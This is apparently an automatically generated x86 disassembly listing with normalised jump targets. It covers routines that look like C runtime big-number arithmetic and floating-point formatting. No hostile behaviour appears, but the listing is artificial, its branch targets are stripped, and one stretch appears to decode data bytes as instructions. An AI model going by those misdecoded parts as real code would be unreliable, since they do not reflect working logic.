mov [ ebx ] edi
push eax
jmp r-xdata
mov edi eax
mov [ ebp - 0x1e4 ] edx
lea eax [ ecx + 0x4 ]
mov [ ebp - 0x1dc ] eax
mov eax esi
mov [ ebp - 0x1dc ] eax
lea edi [ ecx + 0x4 ]
mov eax edx
jmp r-xdata
cmp edi 0x1
je r-xdata
push edi
lea eax [ ebp - 0x1d0 ]
mov [ ebp - 0x1d4 ] edi
push eax
push 0x1cc
mov [ ebx ] edi
push esi
jmp r-xdata
pop edi
pop esi
mov al 0x1
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_40c3ae
mov esp ebp
pop ebp
retn
mov eax [ ebx ]
test eax eax
je r-xdata
call sub_443b14
add esp 0x10
mov eax [ ebp - 0x1e0 ]
mov [ eax ] edx
lea eax [ edx * 4 ]
push eax
lea eax [ ebp - 0x1d0 ]
push eax
push 0x1cc
push [ ebp - 0x1e8 ]
lea eax [ ebp - 0x1d0 ]
sub edi eax
mov [ ebp - 0x1f0 ] edi
lea esp [ esp ]
xor edx edx
mov [ ebp - 0x1d8 ] eax
xor ebx ebx
mov [ ebp - 0x1d4 ] edx
test eax eax
je r-xdata
mov eax [ ebx ]
mov [ ebp - 0x1dc ] eax
test eax eax
je r-xdata
lea edx [ ebx + 0x4 ]
xor esi esi
mov [ ebp - 0x1dc ] edx
xor ecx ecx
mov ebx eax
xor esi esi
xor edi edi
mov ecx ebx
cmp [ ebp - 0x1e4 ] esi
je r-xdata
cmp ebx edx
jne r-xdata
mov ebx [ ebp - 0x1d8 ]
xor edi edi
xor ecx ecx
mov eax edi
mul [ edx + ecx * 4 ]
add eax esi
adc edx 0x0
mov esi edx
mov edx [ ebp - 0x1dc ]
mov [ edx + ecx * 4 ] eax
inc ecx
cmp ecx ebx
jne r-xdata
mov ebx [ ebp - 0x1e0 ]
test esi esi
je r-xdata
cmp ecx 0x73
je r-xdata
cmp ecx 0x73
je r-xdata
inc ebx
cmp ebx [ ebp - 0x1d8 ]
jne r-xdata
lea edx [ ebx + 0x1 ]
mov [ ebp + ebx * 4 - 0x1d0 ] eax
mov [ ebp - 0x1d4 ] edx
jmp r-xdata
mov eax ebx
mul [ esi + ecx * 4 ]
add eax edi
mov [ esi + ecx * 4 ] eax
adc edx 0x0
inc ecx
mov edi edx
cmp ecx [ ebp - 0x1dc ]
jne r-xdata
mov ebx [ ebp - 0x1e0 ]
test edi edi
je r-xdata
mov eax [ ebx ]
cmp eax 0x73
jae r-xdata
mov eax [ ebp - 0x1e0 ]
push 0x0
mov [ ebp - 0x3c0 ] 0x0
mov [ eax ] 0x0
lea eax [ ebp - 0x3bc ]
push eax
push 0x1cc
push [ ebp - 0x1e8 ]
call sub_443b14
mov ecx [ ebp - 0x4 ]
add esp 0x10
xor ecx ebp
xor al al
pop edi
pop esi
pop ebx
call sub_40c3ae
mov esp ebp
pop ebp
retn
mov edi [ ebp - 0x1f0 ]
test esi esi
je r-xdata
cmp ecx edx
jne r-xdata
lea eax [ edi + ebx * 4 ]
mov eax [ ebp + eax - 0x1d0 ]
mov [ ebp - 0x1ec ] eax
test eax eax
jne r-xdata
mov eax [ ebx ]
cmp eax 0x73
jae r-xdata
push 0x0
lea eax [ ebp - 0x1d0 ]
mov [ ebp - 0x1d4 ] 0x0
push eax
push 0x1cc
push edx
mov [ ebx ] 0x0
call sub_443b14
add esp 0x10
xor al al
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_40c3ae
mov esp ebp
pop ebp
retn
mov [ ebx + eax * 4 + 0x4 ] esi
mov al 0x1
inc [ ebx ]
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_40c3ae
mov esp ebp
pop ebp
retn
cmp ecx 0x73
je r-xdata
mov eax [ ebp - 0x1dc ]
mov eax [ eax + edi * 4 ]
mul [ ebp - 0x1ec ]
add eax esi
adc edx 0x0
add [ ebp + ecx * 4 - 0x1d0 ] eax
adc edx 0x0
inc edi
inc ecx
mov esi edx
mov edx [ ebp - 0x1d4 ]
cmp edi [ ebp - 0x1e4 ]
jne r-xdata
lea eax [ ebx + 0x1 ]
mov [ ebp + ecx * 4 - 0x1d0 ] 0x0
add eax edi
mov [ ebp - 0x1d4 ] eax
push 0x0
lea eax [ ebp - 0x1d0 ]
mov [ ebp - 0x1d4 ] 0x0
push eax
push 0x1cc
push esi
mov [ ebx ] 0x0
call sub_443b14
add esp 0x10
xor al al
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_40c3ae
mov esp ebp
pop ebp
retn
mov [ ebx + eax * 4 + 0x4 ] edi
mov al 0x1
inc [ ebx ]
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_40c3ae
mov esp ebp
pop ebp
retn
cmp ecx edx
jne r-xdata
mov eax esi
xor esi esi
add [ ebp + ecx * 4 - 0x1d0 ] eax
mov edx [ ebp - 0x1d4 ]
adc esi esi
inc ecx
test esi esi
jne r-xdata
lea eax [ ecx + 0x1 ]
mov [ ebp + ecx * 4 - 0x1d0 ] 0x0
mov [ ebp - 0x1d4 ] eax
sub_441d20
mov edi edi
push ebp
mov ebp esp
sub esp 0x1d8
push edi
mov edi [ ebp + 0xc ]
test edi edi
jne r-xdata
cmp edi 0x1
je r-xdata
mov eax [ ebp + 0x8 ]
lea ecx [ ebp - 0x1d4 ]
push edi
push ecx
push 0x1cc
mov [ eax ] edi
add eax 0x4
push eax
mov [ ebp - 0x1d8 ] edi
call sub_443b14
add esp 0x10
mov al 0x1
pop edi
mov esp ebp
pop ebp
retn
mov ecx [ ebp + 0x8 ]
mov eax [ ecx ]
test eax eax
je r-xdata
push ebx
lea edx [ ecx + 0x4 ]
xor ebx ebx
push esi
mov [ ebp - 0x4 ] edx
xor esi esi
mov ecx eax
lea ebx [ ebx ]
mov eax edi
mul [ edx + esi * 4 ]
add eax ebx
adc edx 0x0
mov ebx edx
mov edx [ ebp - 0x4 ]
mov [ edx + esi * 4 ] eax
inc esi
cmp esi ecx
jne r-xdata
mov ecx [ ebp + 0x8 ]
test ebx ebx
je r-xdata
pop esi
pop ebx
mov al 0x1
pop edi
mov esp ebp
pop ebp
retn
mov eax [ ecx ]
cmp eax 0x73
jae r-xdata
push 0x0
lea eax [ ebp - 0x1d4 ]
mov [ ebp - 0x1d8 ] 0x0
push eax
push 0x1cc
push edx
mov [ ecx ] 0x0
call sub_443b14
add esp 0x10
xor al al
pop esi
pop ebx
pop edi
mov esp ebp
pop ebp
retn
mov [ ecx + eax * 4 + 0x4 ] ebx
inc [ ecx ]
sub_441e10
mov edi edi
push ebp
mov ebp esp
sub esp 0x3c8
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax 0xcccccccd
mul [ ebp + 0xc ]
push ebx
mov ecx edx
shr ecx 0x3
push esi
mov eax ecx
mov [ ebp - 0x3b8 ] ecx
mov [ ebp - 0x3bc ] eax
push edi
mov edi [ ebp + 0x8 ]
mov [ ebp - 0x3a8 ] edi
test eax eax
je r-xdata
lea eax [ ecx + ecx * 4 ]
mov ecx [ ebp + 0xc ]
add eax eax
sub ecx eax
je r-xdata
mov ecx 0x26
lea esp [ esp ]
pop edi
pop esi
mov al 0x1
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_40c3ae
mov esp ebp
pop ebp
retn
mov ebx [ ecx * 4 + r--data ]
test ebx ebx
jne r-xdata
mov edi [ ebp - 0x3a8 ]
mov edx [ edi ]
lea esi [ edi + 0x4 ]
mov [ ebp - 0x3b4 ] edx
cmp edx 0x1
ja r-xdata
mov edi [ ebp - 0x1d0 ]
test edi edi
jne r-xdata
cmp ebx 0x1
je r-xdata
push ebx
lea eax [ ebp - 0x1d0 ]
mov [ ebp - 0x1d4 ] ebx
push eax
lea eax [ edi + 0x4 ]
mov [ edi ] ebx
push 0x1cc
push eax
call sub_443b14
add esp 0x10
cmp ecx edx
setb al
test al al
je r-xdata
mov ebx [ esi ]
lea eax [ ecx * 4 ]
push eax
lea eax [ ebp - 0x1d0 ]
mov [ edi ] ecx
push eax
push 0x1cc
push esi
call sub_443b14
add esp 0x10
test ebx ebx
jne r-xdata
cmp edi 0x1
jne r-xdata
mov [ ebp - 0x3a4 ] edi
lea eax [ ebp - 0x3a0 ]
mov edi [ ebp - 0x3a8 ]
push 0x0
push eax
push 0x1cc
lea eax [ edi + 0x4 ]
mov [ edi ] 0x0
push eax
call sub_443b14
add esp 0x10
jmp r-xdata
mov eax [ edi ]
mov [ ebp - 0x3b8 ] eax
test eax eax
je r-xdata
lea eax [ ebp - 0x1d0 ]
mov [ ebp - 0x3b4 ] ecx
mov [ ebp - 0x3c0 ] eax
mov eax edx
mov [ ebp - 0x3c0 ] esi
mov eax ecx
lea esi [ ebp - 0x1d0 ]
jmp r-xdata
cmp ebx 0x1
je r-xdata
push ebx
lea eax [ ebp - 0x1d0 ]
mov [ ebp - 0x1d4 ] ebx
push eax
push 0x1cc
push esi
mov [ edi ] ebx
call sub_443b14
add esp 0x10
jmp r-xdata
mov eax [ ebp - 0x3a8 ]
mov ebx [ eax ]
test ebx ebx
jne r-xdata
mov edi [ ebp - 0x3a8 ]
jmp r-xdata
mov al 0x1
lea edx [ edi + 0x4 ]
xor esi esi
mov [ ebp - 0x3b0 ] edx
xor ecx ecx
mov edi eax
mov [ edi ] edx
shl edx 0x2
test edx edx
je r-xdata
lea eax [ ebp - 0x3a0 ]
sub esi eax
mov [ ebp - 0x3c8 ] esi
lea ecx [ ecx ]
xor edx edx
mov [ ebp - 0x3ac ] eax
xor ebx ebx
mov [ ebp - 0x3a4 ] edx
test eax eax
je r-xdata
mov eax [ edi ]
mov [ ebp - 0x3ac ] eax
test eax eax
je r-xdata
xor esi esi
lea edx [ eax + 0x4 ]
xor ecx ecx
lea ebx [ ebx ]
mov edi eax
jmp r-xdata
push 0x0
lea eax [ ebp - 0x1d0 ]
mov [ ebp - 0x1d4 ] 0x0
push eax
lea eax [ edi + 0x4 ]
mov [ edi ] 0x0
push 0x1cc
push eax
call sub_443b14
add esp 0x10
xor al al
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_40c3ae
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x3bc ]
mov ecx 0x26
sub eax [ ebp - 0x3b0 ]
mov [ ebp - 0x3bc ] eax
jne r-xdata
mov eax ebx
mul [ edx + ecx * 4 ]
add eax esi
adc edx 0x0
mov esi edx
mov edx [ ebp - 0x3b0 ]
mov [ edx + ecx * 4 ] eax
inc ecx
cmp ecx edi
jne r-xdata
mov edi [ ebp - 0x3a8 ]
test esi esi
je r-xdata
lea eax [ edi + 0x4 ]
test eax eax
jne r-xdata
xor esi esi
xor edi edi
mov ecx ebx
cmp [ ebp - 0x3b4 ] esi
je r-xdata
cmp ebx edx
jne r-xdata
xor edi edi
xor ecx ecx
mov eax edi
mov edi [ ebp - 0x1d0 ]
mul [ edx + ecx * 4 ]
add eax esi
adc edx 0x0
mov esi edx
mov edx [ ebp - 0x3a8 ]
add edx 0x4
mov [ edx + ecx * 4 ] eax
inc ecx
cmp ecx ebx
jne r-xdata
mov edi [ ebp - 0x3a8 ]
test esi esi
je r-xdata
cmp eax 0x26
mov ebx eax
cmova ebx ecx
mov [ ebp - 0x3b0 ] ebx
movzx ecx [ ebx * 4 + r--data ]
movzx esi [ ebx * 4 + r--data ]
lea edi [ ecx * 4 ]
lea eax [ ecx + esi ]
push edi
mov [ ebp - 0x1d4 ] eax
lea eax [ ebp - 0x1d0 ]
push 0x0
push eax
call sub_40de60
lea eax [ esi * 4 ]
push eax
movzx eax [ ebx * 4 + r--data ]
lea eax [ eax * 4 + r--data ]
push eax
lea eax [ ebp - 0x1d0 ]
add eax edi
push eax
call sub_40d8e0
mov ecx [ ebp - 0x1d4 ]
add esp 0x18
cmp ecx 0x1
ja r-xdata
mov ecx [ ebp - 0x3b8 ]
mov eax [ edi ]
cmp eax 0x73
jae r-xdata
cmp edx 0x1cc
ja r-xdata
call sub_42fef5
mov [ eax ] 0x16
jmp r-xdata
cmp ecx 0x73
je r-xdata
cmp ecx 0x73
je r-xdata
inc ebx
cmp ebx [ ebp - 0x3ac ]
jne r-xdata
lea edx [ ebx + 0x1 ]
mov [ ebp + ebx * 4 - 0x3a0 ] eax
mov [ ebp - 0x3a4 ] edx
jmp r-xdata
mov eax ebx
mul [ esi + ecx * 4 ]
add eax edi
mov [ esi + ecx * 4 ] eax
adc edx 0x0
inc ecx
mov edi edx
cmp ecx [ ebp - 0x3ac ]
jne r-xdata
test edi edi
je r-xdata
mov eax [ edi ]
cmp eax 0x73
jae r-xdata
push 0x0
lea eax [ ebp - 0x1d0 ]
mov [ ebp - 0x1d4 ] 0x0
push eax
push 0x1cc
push edx
mov [ edi ] 0x0
call sub_443b14
mov ecx [ ebp - 0x4 ]
add esp 0x10
xor ecx ebp
xor al al
pop edi
pop esi
pop ebx
call sub_40c3ae
mov esp ebp
pop ebp
retn
mov [ edi + eax * 4 + 0x4 ] esi
mov al 0x1
inc [ edi ]
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_40c3ae
mov esp ebp
pop ebp
retn
push 0x1cc
push 0x0
push eax
call sub_40de60
add esp 0xc
call sub_42fef5
mov [ eax ] 0x22
push edx
lea ecx [ ebp - 0x3a0 ]
push ecx
push eax
call sub_40d8e0
add esp 0xc
jmp r-xdata
call sub_42fdcf
mov edi [ ebp - 0x3a8 ]
xor al al
mov [ edi ] 0x0
jmp r-xdata
mov esi [ ebp - 0x3c8 ]
test esi esi
je r-xdata
cmp ecx edx
jne r-xdata
lea eax [ esi + ebx * 4 ]
mov eax [ ebp + eax - 0x3a0 ]
mov [ ebp - 0x3c4 ] eax
test eax eax
jne r-xdata
mov edi [ ebp - 0x3a8 ]
mov ecx [ ebp - 0x3a8 ]
mov eax [ ecx ]
cmp eax 0x73
jae r-xdata
push 0x0
lea eax [ ebp - 0x1d0 ]
mov [ ebp - 0x1d4 ] 0x0
push eax
push 0x1cc
push edx
mov [ edi ] 0x0
call sub_443b14
add esp 0x10
xor al al
jmp r-xdata
mov [ edi + eax * 4 + 0x4 ] esi
inc [ edi ]
jmp r-xdata
test al al
je r-xdata
lea ecx [ ecx ]
mov eax [ ebp - 0x3c0 ]
mov eax [ eax + edi * 4 ]
mul [ ebp - 0x3c4 ]
add eax esi
adc edx 0x0
add eax [ ebp + ecx * 4 - 0x3a0 ]
mov [ ebp + ecx * 4 - 0x3a0 ] eax
adc edx 0x0
inc edi
inc ecx
mov esi edx
mov edx [ ebp - 0x3a4 ]
cmp edi [ ebp - 0x3b4 ]
jne r-xdata
lea eax [ ebx + 0x1 ]
mov [ ebp + ecx * 4 - 0x3a0 ] 0x0
add eax edi
mov [ ebp - 0x3a4 ] eax
push 0x0
lea eax [ ebp - 0x1d0 ]
mov [ ebp - 0x1d4 ] 0x0
push eax
mov edi ecx
push 0x1cc
push esi
mov [ edi ] 0x0
call sub_443b14
add esp 0x10
xor al al
jmp r-xdata
mov [ ecx + eax * 4 + 0x4 ] edi
mov edi ecx
inc [ edi ]
jmp r-xdata
cmp ecx edx
jne r-xdata
mov eax esi
xor esi esi
add eax [ ebp + ecx * 4 - 0x3a0 ]
mov [ ebp + ecx * 4 - 0x3a0 ] eax
mov edx [ ebp - 0x3a4 ]
adc esi esi
inc ecx
test esi esi
jne r-xdata
lea eax [ ecx + 0x1 ]
mov [ ebp + ecx * 4 - 0x3a0 ] 0x0
mov [ ebp - 0x3a4 ] eax
cmp ecx 0x73
je r-xdata
sub_4423b0
mov edi edi
push ebp
mov ebp esp
push esi
push edi
mov edi [ ebp + 0xc ]
xor esi esi
xor ecx ecx
test edi edi
je r-xdata
pop edi
mov eax esi
pop esi
pop ebp
retn
mov edx [ ebp + 0x8 ]
push ebx
mov ebx [ ebp + 0x10 ]
lea esp [ esp ]
mov eax ebx
mul [ edx + ecx * 4 ]
add eax esi
adc edx 0x0
mov esi edx
mov edx [ ebp + 0x8 ]
mov [ edx + ecx * 4 ] eax
inc ecx
cmp ecx edi
jne r-xdata
pop ebx
sub_4423f0
mov edi edi
push ebp
mov ebp esp
sub esp 0x1ec
push ebx
mov ebx [ ebp + 0xc ]
xor edx edx
push esi
mov eax ebx
mov esi 0x20
shr eax 0x5
and ebx 0x1f
mov ecx esi
mov [ ebp - 0xc ] eax
sub ecx ebx
mov [ ebp + 0xc ] ebx
push edi
lea eax [ esi - 0x1f ]
mov [ ebp - 0x1c ] ecx
call sub_449990
mov edx [ ebp + 0x8 ]
dec eax
mov [ ebp - 0x18 ] eax
not eax
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x8 ] 0x0
mov edi [ edx ]
mov ecx [ edx + edi * 4 ]
bsr eax ecx
je r-xdata
xor eax eax
inc eax
jmp r-xdata
xor bl bl
test bl bl
je r-xdata
mov ecx [ ebp - 0xc ]
sub esi eax
cmp ebx esi
seta bl
lea eax [ edi + ecx ]
mov [ ebp - 0x1 ] bl
cmp eax 0x73
seta bh
cmp eax 0x73
jne r-xdata
push 0x0
lea eax [ ebp - 0x1e8 ]
mov [ ebp - 0x1ec ] 0x0
push eax
lea eax [ edx + 0x4 ]
mov [ edx ] 0x0
push 0x1cc
push eax
call sub_443b14
add esp 0x10
xor al al
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
test bl bl
jne r-xdata
mov bl 0x1
jmp r-xdata
mov esi 0x72
cmp eax esi
cmovb esi eax
mov [ ebp - 0x8 ] esi
mov ebx esi
cmp esi 0xffffffff
je r-xdata
test bh bh
jne r-xdata
test ecx ecx
je r-xdata
sub esi ecx
lea edi [ edx + 0x4 ]
mov eax ebx
inc eax
lea edi [ edi + esi * 4 ]
lea eax [ edx + eax * 4 ]
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x1 ] 0x0
je r-xdata
lea edi [ edx + 0x4 ]
xor eax eax
[ edi ]
mov esi [ ebp - 0x8 ]
mov ecx [ edx ]
cmp esi ecx
jae r-xdata
pop edi
mov [ edx ] esi
mov al 0x1
pop esi
pop ebx
mov esp ebp
pop ebp
retn
inc esi
xor edx edx
mov edx [ edi ]
jmp r-xdata
xor eax eax
mov eax [ edi - 0x4 ]
jmp r-xdata
lea eax [ esi - 0x1 ]
cmp eax ecx
jae r-xdata
cmp ebx ecx
jb r-xdata
and eax [ ebp - 0x14 ]
dec ebx
mov ecx [ ebp - 0x1c ]
dec esi
and edx [ ebp - 0x18 ]
sub edi 0x4
shr eax cl
mov ecx [ ebp + 0xc ]
shl edx cl
mov ecx [ ebp - 0x10 ]
or eax edx
mov edx [ ebp + 0x8 ]
mov [ ecx ] eax
sub ecx 0x4
mov [ ebp - 0x10 ] ecx
mov ecx [ ebp - 0xc ]
cmp ebx 0xffffffff
jne r-xdata
sub_442540
mov edi edi
push ebp
mov ebp esp
sub esp 0x790
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
mov ebx [ ebp + 0x18 ]
lea eax [ ebp - 0x790 ]
push esi
push edi
mov edi [ ebp + 0x14 ]
push eax
mov [ ebp - 0x77c ] edi
mov [ ebp - 0x754 ] ebx
call sub_446d1d
mov eax [ ebp - 0x790 ]
add esp 0x4
and eax 0x1f
cmp al 0x1f
jne r-xdata
lea eax [ ebp - 0x790 ]
push eax
call sub_446d83
add esp 0x4
mov [ ebp - 0x788 ] 0x1
mov [ ebp - 0x788 ] 0x0
jmp r-xdata
movsx eax al
xor ecx ecx
mov [ edi ] eax
mov [ edi + 0x8 ] ebx
mov edi edx
mov ebx [ ebp + 0x8 ]
shr edi 0x14
and edi 0x7ff
mov eax edi
or eax ecx
jne r-xdata
mov al 0x20
mov edx [ ebp + 0xc ]
mov esi edx
shr esi 0x1f
mov eax esi
or eax 0x0
mov al 0x2d
jne r-xdata
cmp edi 0x7ff
jne r-xdata
mov ecx edx
mov eax ebx
and ecx 0xfffff
or eax ecx
jne r-xdata
xor eax eax
test ecx ecx
jne r-xdata
xor ecx ecx
mov ecx [ ebp - 0x77c ]
push r--data
mov [ ecx + 0x4 ] eax
mov eax [ ebp + 0x10 ]
and edx 0x7fffffff
mov [ ebp + 0x8 ] ebx
inc eax
mov [ ebp + 0xc ] edx
fld [ ebp + 0x8 ]
fst [ ebp - 0x778 ]
mov edi [ ebp - 0x774 ]
mov ecx edi
mov [ ebp - 0x770 ] eax
shr ecx 0x14
mov eax ecx
mov [ ebp - 0x780 ] 0x0
and eax 0x7ff
or eax 0x0
jne r-xdata
jmp [ eax * 4 + jump_table_443b04 ]
mov ecx edx
mov eax ebx
and ecx 0xfffff
or eax ecx
jne r-xdata
cmp [ ebp - 0x788 ] 0x0
pop edi
pop esi
pop ebx
je r-xdata
jmp r-xdata
xor dl dl
mov eax 0x100000
mov dl 0x1
jmp r-xdata
push r--data
jmp r-xdata
push r--data
jmp r-xdata
push r--data
jmp r-xdata
push r--data
jmp r-xdata
or esi 0x0
je r-xdata
mov ecx [ ebp - 0x77c ]
mov eax 0x1
mov [ ecx + 0x4 ] eax
jmp r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_40c3ae
mov esp ebp
pop ebp
retn
lea eax [ ebp - 0x790 ]
push eax
call sub_446d3a
add esp 0x4
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
call sub_42fdfc
mov edi edi
xchg ebp eax
inc esp
add [ edi - 0x56ffbbda ] bl
inc esp
add [ ebx - 0x74ffbbda ] dh
call [ ebp - 0x75 ]
in al dx
push esi
mov esi [ ebp + 0x14 ]
test esi esi
jne r-xdata
xor ecx ecx
mov [ ebp - 0x764 ] ecx
cmp eax 0x80000000
jne r-xdata
mov esi [ ebp - 0x778 ]
and edi 0xfffff
add esi 0x0
adc edi eax
xor eax eax
test dl dl
setne al
and ecx 0x7ff
inc eax
add ecx 0xfffffbcc
add eax ecx
mov [ ebp - 0x74c ] eax
call sub_446e20
sub esp 0x8
fstp [ esp ]
call sub_446f30
add esp 0x8
call sub_4499b0
mov [ ebp - 0x764 ] eax
cmp eax 0x7fffffff
je r-xdata
push [ ebp + 0x1c ]
push [ ebp - 0x754 ]
call sub_42cfc7
add esp 0xc
test eax eax
je r-xdata
mov ecx edx
xor eax eax
and ecx 0x80000
or eax ecx
mov eax 0x2
jne r-xdata
test ebx ebx
jne r-xdata
dec eax
cmp eax 0x3
ja r-xdata
mov eax [ ebp + 0x8 ]
test eax eax
jne r-xdata
xor eax eax
jmp r-xdata
cmp esi 0xfffffc02
je r-xdata
mov [ ebp - 0x3a0 ] 0x0
mov [ ebp - 0x39c ] 0x100000
mov [ ebp - 0x3a4 ] 0x2
cmp ebx 0x2
jne r-xdata
xor ebx ebx
mov [ ebp - 0x1d0 ] esi
mov esi [ ebp - 0x74c ]
test edi edi
mov [ ebp - 0x1cc ] edi
setne bl
inc ebx
mov [ ebp - 0x1d4 ] ebx
test esi esi
js r-xdata
mov ecx [ ebp - 0x77c ]
mov [ ecx + 0x4 ] 0x1
jmp r-xdata
mov eax 0x3
cmp ecx 0x80000
jne r-xdata
push edi
mov edi [ ebp + 0x10 ]
test edi edi
je r-xdata
call sub_42fef5
push 0x16
pop esi
mov [ eax ] esi
call sub_42fdcf
mov eax esi
jmp r-xdata
pop esi
pop ebp
retn
mov eax [ ebp + ebx * 4 - 0x1d4 ]
bsr eax eax
mov [ ebp - 0x774 ] 0x0
je r-xdata
mov [ ebp - 0x3a0 ] 0x0
mov [ ebp - 0x39c ] 0x100000
mov [ ebp - 0x3a4 ] 0x2
cmp ebx 0x2
jne r-xdata
lea edi [ esi + 0x1 ]
xor edx edx
mov eax edi
mov esi 0x20
shr eax 0x5
and edi 0x1f
mov ecx esi
mov [ ebp - 0x74c ] eax
sub ecx edi
mov [ ebp - 0x758 ] edi
lea eax [ esi - 0x1f ]
mov [ ebp - 0x76c ] ecx
call sub_449990
mov ecx [ ebp + ebx * 4 - 0x1d4 ]
dec eax
bsr ecx ecx
mov [ ebp - 0x768 ] eax
not eax
mov [ ebp - 0x760 ] eax
mov [ ebp - 0x774 ] 0x0
je r-xdata
xor ecx ecx
lea ebx [ ebx ]
mov ecx [ ebp - 0x77c ]
lea eax [ ebx + 0x4 ]
mov [ ecx + 0x4 ] 0x1
jmp r-xdata
push [ ebp + 0xc ]
push 0x0
push eax
call sub_40de60
add esp 0xc
test edi edi
jne r-xdata
cmp [ ebp + 0xc ] esi
jb r-xdata
xor ecx ecx
lea ecx [ eax + 0x1 ]
jmp r-xdata
xor ecx ecx
lea esp [ esp ]
xor eax eax
lea eax [ ecx + 0x1 ]
jmp r-xdata
add ecx 0x4
cmp ecx 0x8
jne r-xdata
cmp [ ebp + 0xc ] esi
jae r-xdata
call sub_42fef5
push 0x16
jmp r-xdata
push esi
push edi
push eax
call sub_40d8e0
add esp 0xc
xor eax eax
jmp r-xdata
xor al al
test al al
je r-xdata
mov eax 0x20
sub eax ecx
cmp eax 0x1
setb al
cmp ebx 0x73
mov [ ebp - 0x745 ] al
seta cl
cmp ebx 0x73
jne r-xdata
add ecx 0x4
cmp ecx 0x8
jne r-xdata
xor dl dl
test dl dl
je r-xdata
sub esi eax
mov eax [ ebp - 0x74c ]
cmp edi esi
seta dl
lea ecx [ ebx + eax ]
mov [ ebp - 0x745 ] dl
cmp ecx 0x73
seta dh
cmp ecx 0x73
jne r-xdata
mov eax [ ebp + ecx - 0x3a0 ]
cmp eax [ ebp + ecx - 0x1d0 ]
jne r-xdata
lea ecx [ esi + 0x2 ]
xor edx edx
mov eax ecx
mov esi 0x20
shr eax 0x5
and ecx 0x1f
mov [ ebp - 0x74c ] eax
mov eax esi
sub eax ecx
mov [ ebp - 0x758 ] ecx
mov [ ebp - 0x75c ] eax
lea eax [ esi - 0x1f ]
mov ecx [ ebp - 0x75c ]
call sub_449990
dec eax
mov [ ebp - 0x774 ] 0x0
bsr ecx edi
mov [ ebp - 0x76c ] eax
not eax
mov [ ebp - 0x768 ] eax
je r-xdata
push 0x16
pop eax
call sub_42fef5
push 0x22
pop esi
mov [ eax ] esi
call sub_42fdcf
mov eax esi
jmp r-xdata
pop edi
push 0x0
lea eax [ ebp - 0x3a0 ]
mov [ ebp - 0x3a4 ] 0x0
push eax
lea eax [ ebp - 0x1d0 ]
mov [ ebp - 0x1d4 ] 0x0
push 0x1cc
push eax
call sub_443b14
add esp 0x10
test al al
jne r-xdata
mov al 0x1
jmp r-xdata
mov eax [ ebp + ecx - 0x3a0 ]
cmp eax [ ebp + ecx - 0x1d0 ]
jne r-xdata
bsr eax edi
mov [ ebp - 0x774 ] 0x0
je r-xdata
push 0x0
lea eax [ ebp - 0x3a0 ]
mov [ ebp - 0x3a4 ] 0x0
push eax
lea eax [ ebp - 0x1d0 ]
mov [ ebp - 0x1d4 ] 0x0
push 0x1cc
push eax
call sub_443b14
add esp 0x10
mov [ ebp - 0x3a0 ] 0x2
jmp r-xdata
test dl dl
jne r-xdata
mov dl 0x1
jmp r-xdata
xor eax eax
lea eax [ ecx + 0x1 ]
jmp r-xdata
neg ecx
mul ecx
mov [ ebp - 0x768 ] ecx
shr edx 0x3
mov eax edx
mov [ ebp - 0x774 ] edx
mov [ ebp - 0x75c ] eax
test eax eax
je r-xdata
mul ecx
mov ecx edx
shr ecx 0x3
mov eax ecx
mov [ ebp - 0x780 ] ecx
mov [ ebp - 0x75c ] eax
test eax eax
je r-xdata
mov eax 0x72
cmp ebx eax
cmovb eax ebx
mov [ ebp - 0x760 ] eax
cmp eax 0xffffffff
je r-xdata
test cl cl
jne r-xdata
xor ecx ecx
lea ecx [ eax + 0x1 ]
jmp r-xdata
push 0x4
lea eax [ ebp - 0x3a0 ]
mov [ ebp - 0x39c ] 0x0
push eax
lea eax [ ebp - 0x570 ]
mov [ ebp - 0x3a4 ] 0x1
push 0x1cc
push eax
mov [ ebp - 0x574 ] 0x1
call sub_443b14
add esp 0x10
jmp r-xdata
mov edx 0x72
cmp ecx edx
cmovb edx ecx
mov [ ebp - 0x75c ] edx
mov edi edx
cmp edx 0xffffffff
je r-xdata
test dh dh
jne r-xdata
xor dl dl
test dl dl
je r-xdata
sub esi eax
mov eax [ ebp - 0x74c ]
cmp [ ebp - 0x758 ] esi
seta dl
lea ecx [ eax + 0x2 ]
mov [ ebp - 0x745 ] dl
cmp ecx 0x73
seta dh
cmp ecx 0x73
jne r-xdata
lea eax [ edx + edx * 4 ]
add eax eax
sub ecx eax
je r-xdata
mov ecx 0x26
lea esp [ esp ]
mov edi [ ebp - 0x764 ]
lea eax [ ecx + ecx * 4 ]
add eax eax
sub edi eax
je r-xdata
mov ecx 0x26
cmp [ ebp - 0x745 ] 0x0
je r-xdata
lea edi [ ebp - 0x1d0 ]
mov edx eax
lea edi [ edi + eax * 4 ]
mov esi edi
xor edi edi
mov edi [ esi ]
jmp r-xdata
mov eax 0x20
mov edx 0x2
sub eax ecx
cmp eax 0x2
lea eax [ ebp - 0x1c8 ]
mov [ ebp - 0x750 ] eax
mov esi eax
setb [ ebp - 0x745 ]
mov ecx [ ebp - 0x764 ]
mov eax 0xcccccccd
test ecx ecx
js r-xdata
test eax eax
je r-xdata
mov esi edx
lea ecx [ ebp - 0x1d0 ]
sub esi eax
lea ecx [ ecx + esi * 4 ]
mov [ ebp - 0x750 ] ecx
push 0x0
lea eax [ ebp - 0x3a0 ]
mov [ ebp - 0x3a4 ] 0x0
push eax
lea eax [ ebp - 0x1d0 ]
mov [ ebp - 0x1d4 ] 0x0
push 0x1cc
push eax
call sub_443b14
add esp 0x10
test dl dl
jne r-xdata
mov dl 0x1
jmp r-xdata
